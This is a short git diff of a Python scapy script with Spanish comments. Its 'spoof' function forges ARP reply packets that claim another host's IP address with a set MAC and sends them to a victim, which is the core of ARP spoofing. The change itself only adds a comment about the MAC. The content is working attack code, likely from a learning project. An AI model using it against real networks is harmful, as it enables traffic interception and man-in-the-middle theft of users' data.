@@ -28,7 +28,7 @@ def spoof(ip_address, spoof_ip):
     # 'psrc' es la dirección IP del remitente (la dirección que estamos suplantando)
     # 'pdst' es la dirección IP del destino (la víctima)
     # 'hwsrc' es la dirección MAC del remitente (opcional aquí, para la suplantación)
-    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
+    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") #Importarnte tener la misma MAC o cambiarla.
     # Envía el paquete ARP sin mostrar salida detallada
     scapy.send(arp_packet, verbose=False)
 
